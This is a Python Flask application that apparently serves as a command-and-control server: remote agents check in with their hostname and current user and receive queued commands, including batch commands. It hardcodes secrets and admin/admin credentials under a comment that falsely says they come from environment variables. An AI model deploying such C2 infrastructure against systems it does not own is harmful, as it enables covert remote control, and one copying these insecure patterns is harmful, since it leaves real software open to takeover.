
from flask import Flask, request, jsonify, render_template, redirect, url_for, flash, session
import sqlite3
import uuid
import time
from datetime import datetime
import os
import logging
import socket
import json
from discovery import ServerAnnouncer, ServerListener

app = Flask(__name__)

# Global listener for discovered servers
discovery_listener = ServerListener()
announcer = None

# --- CONFIGURATION ---
# Secrets are now loaded from environment variables for security
app.config['SECRET_KEY'] = 'a_fixed_flask_secret_key'
API_SECRET_KEY = 'a_fixed_c2_api_key'
ADMIN_USERNAME = 'admin'
ADMIN_PASSWORD = 'admin'
DATABASE_FILE = "c2_server.db"
# ---------------------

# --- LOGGING SETUP ---
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
# ---------------------

def get_db():
    """Establishes a connection to the SQLite database."""
    db = sqlite3.connect(DATABASE_FILE)
    db.row_factory = sqlite3.Row
    return db

def init_db():
    """Initializes the database with the required schema if tables don't exist."""
    db = get_db()
    cursor = db.cursor()

    # Check if tables exist
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='servers'")
    servers_table_exists = cursor.fetchone()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='agents'")
    agents_table_exists = cursor.fetchone()
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='commands'")
    commands_table_exists = cursor.fetchone()

    if not all([servers_table_exists, agents_table_exists, commands_table_exists]):
        print("One or more tables not found. Initializing database...")
        with open("schema.sql", "r") as f:
            # We need to execute the schema without the DROP statements
            schema_sql = f.read()
            # Simple removal of DROP lines for persistence
            schema_sql = "\n".join([line for line in schema_sql.split('\n') if not line.strip().upper().startswith('DROP')])
            cursor.executescript(schema_sql)
        db.commit()
        print("Database initialized.")
    else:
        print("Database tables already exist. Skipping initialization.")

def get_server_role(ip_address, port):
    db = get_db()
    server_info = db.execute("SELECT role FROM servers WHERE ip_address = ? AND port = ?", (ip_address, port)).fetchone()
    if server_info:
        return server_info['role']
    return "unassigned" # Default role if not explicitly set

# --- API Endpoints (for CLI and Agents) ---
@app.before_request
def check_api_key():
    """Ensure all API requests have the correct key."""
    # This check now specifically targets the /api/admin/ endpoints
    if request.path.startswith('/api/admin/'):
        if request.headers.get('X-API-KEY') != API_SECRET_KEY:
            return jsonify({"error": "Unauthorized"}), 401

@app.route("/api/admin/set_server_role", methods=['POST'])
def api_admin_set_server_role():
    data = request.json
    ip_address = data.get('ip_address')
    port = data.get('port')
    role = data.get('role')

    if not all([ip_address, port, role]):
        return jsonify({"error": "Missing ip_address, port, or role"}), 400

    if role not in ["primary", "secondary", "tertiary", "client"]:
        return jsonify({"error": "Invalid role. Must be primary, secondary, tertiary, or client"}), 400

    db = get_db()
    db.execute(
        "INSERT OR REPLACE INTO servers (ip_address, port, role) VALUES (?, ?, ?)",
        (ip_address, port, role)
    )
    db.commit()
    logging.info(f"Server {ip_address}:{port} set to role: {role}")

    # --- DYNAMIC ROLE UPDATE ---
    # If the role of the current server instance is being changed,
    # update the announcer in real-time.
    if announcer and ip_address == announcer.server_ip and port == announcer.server_port:
        announcer.server_role = role
        logging.info(f"Updated announcer role to: {role}")
    # -------------------------

    return jsonify({"status": "Server role updated", "ip_address": ip_address, "port": port, "role": role})

@app.route("/agent/checkin", methods=['POST'])
def agent_checkin():
    """Endpoint for agents to check in and get commands."""
    data = request.json
    agent_id = data.get('agent_id')
    hostname = data.get('hostname', 'Unknown')
    current_user = data.get('current_user', 'Unknown')
    ip_address = request.remote_addr
    db = get_db()
    if not agent_id:
        agent_id = str(uuid.uuid4())
        db.execute(
            "INSERT INTO agents (id, hostname, ip_address, last_seen, current_user) VALUES (?, ?, ?, ?, ?)",
            (agent_id, hostname, ip_address, datetime.utcnow(), current_user)
        )
        db.commit()
        logging.info(f"New agent registered: {hostname} ({agent_id}) from {ip_address}")
        return jsonify({"agent_id": agent_id, "command": "none"})

    # For existing agents, first try to update.
    cursor = db.cursor()
    cursor.execute(
        "UPDATE agents SET last_seen = ?, ip_address = ?, current_user = ? WHERE id = ?",
        (datetime.utcnow(), ip_address, current_user, agent_id)
    )

    # If no rows were updated, it means the agent_id doesn't exist, so insert it.
    if cursor.rowcount == 0:
        db.execute(
            "INSERT INTO agents (id, hostname, ip_address, last_seen, current_user) VALUES (?, ?, ?, ?, ?)",
            (agent_id, hostname, ip_address, datetime.utcnow(), current_user)
        )
        logging.info(f"Re-registering agent not found in DB: {hostname} ({agent_id}) from {ip_address}")

    command_row = db.execute(
        "SELECT id, command FROM commands WHERE agent_id = ? AND executed = 0 ORDER BY created_at ASC LIMIT 1",
        (agent_id,)
    ).fetchone()
    db.commit()

    if command_row:
        db.execute("UPDATE commands SET executed = 1 WHERE id = ?", (command_row['id'],))
        db.commit()
        logging.info(f"Sent command '{command_row['command']}' to agent {agent_id}")
        return jsonify({"agent_id": agent_id, "command": command_row['command']})
    else:
        return jsonify({"agent_id": agent_id, "command": "none"})

@app.route("/api/admin/agents", methods=['GET'])
def api_admin_get_agents():
    """CLI endpoint to list all registered agents."""
    db = get_db()
    agents = db.execute("SELECT id, hostname, ip_address, last_seen FROM agents").fetchall()
    return jsonify([dict(agent) for agent in agents])

@app.route("/api/admin/command", methods=['POST'])
def api_admin_issue_command():
    """CLI endpoint to issue a command to a specific agent."""
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command') # This will be a JSON object
    if not all([agent_id, command]):
        return jsonify({"error": "Invalid request"}), 400
    db = get_db()
    db.execute(
        "INSERT INTO commands (agent_id, command) VALUES (?, ?)",
        (agent_id, json.dumps(command))
    )
    db.commit()
    logging.info(f"Command '{json.dumps(command)}' queued for agent {agent_id} via API")
    return jsonify({"status": "Command queued", "agent_id": agent_id, "command": command})

@app.route("/api/servers", methods=['GET'])
def api_get_servers():
    """Returns a list of all known servers from the database."""
    db = get_db()
    servers = db.execute("SELECT ip_address, port, role FROM servers").fetchall()
    return jsonify([dict(server) for server in servers])

@app.route("/api/discovered_servers", methods=['GET'])
def api_get_discovered_servers():
    """Returns a list of all servers currently discovered by this instance's listener."""
    return jsonify(discovery_listener.get_active_servers())

@app.route("/servers")
def server_management():
    """Renders the server management HTML page."""
    current_user = os.getlogin()
    return render_template("server_management.html", current_user=current_user)

# --- Web UI Endpoints ---
@app.route("/")
def index():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    db = get_db()
    agents = db.execute("SELECT id, hostname, ip_address, last_seen, current_user FROM agents ORDER BY last_seen DESC").fetchall()
    return render_template("dashboard.html", agents=agents)

@app.route("/login", methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form['username'] == ADMIN_USERNAME and request.form['password'] == ADMIN_PASSWORD:
            session['logged_in'] = True
            flash('You were successfully logged in')
            return redirect(url_for('index'))
        else:
            flash('Invalid credentials')
    return render_template('login.html')

@app.route("/logout")
def logout():
    session.pop('logged_in', None)
    flash('You were logged out')
    return redirect(url_for('login'))

@app.route("/issue_command/<agent_id>/<command>", methods=['GET'])
def issue_command_from_ui(agent_id, command):
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    if command not in ["shutdown", "restart", "sleep"]:
        flash("Invalid command")
        return redirect(url_for('index'))
    db = get_db()
    command_obj = {"action": command}
    db.execute(
        "INSERT INTO commands (agent_id, command) VALUES (?, ?)",
        (agent_id, json.dumps(command_obj))
    )
    db.commit()
    logging.info(f"Command '{command}' queued for agent {agent_id} via UI")
    flash(f"Command '{command}' sent to agent {agent_id}")
    return redirect(url_for('index'))

@app.route("/batch_command", methods=['POST'])
def batch_command():
    if 'logged_in' not in session:
        return redirect(url_for('login'))
    
    data = request.get_json()
    agent_ids = data.get('agent_ids')
    command = data.get('command')

    if not agent_ids or not command:
        flash("Invalid batch command request.")
        return jsonify({"status": "error", "message": "Missing agent_ids or command"}), 400

    db = get_db()
    command_str = json.dumps(command) # Serialize the command object
    for agent_id in agent_ids:
        db.execute(
            "INSERT INTO commands (agent_id, command) VALUES (?, ?)",
            (agent_id, command_str)
        )
    db.commit()

    logging.info(f"Batch command '{command_str}' queued for {len(agent_ids)} agents via UI.")
    flash(f"Batch command '{command_str}' sent to {len(agent_ids)} agents.")
    return jsonify({"status": "success"})

def get_local_ip():
    """Attempts to get the local non-loopback IP address."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't actually connect, just gets the IP address used for routing
        s.connect(('8.8.8.8', 80))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1' # Fallback to localhost
    finally:
        s.close()
    return IP

if __name__ == "__main__":
    init_db() # Make sure the DB is ready

    # Get the local IP address to announce
    server_ip = get_local_ip() # Use the actual local IP
    server_port = 5000 # Assuming this is the port your Flask app runs on

    current_server_role = get_server_role(server_ip, server_port)
    announcer = ServerAnnouncer(server_ip, server_port, current_server_role)
    announcer.start()
    discovery_listener.start() # Start the discovery listener

    try:
        app.run(host='0.0.0.0', port=server_port, debug=False)
    finally:
        announcer.stop()
        discovery_listener.stop() # Stop the discovery listener
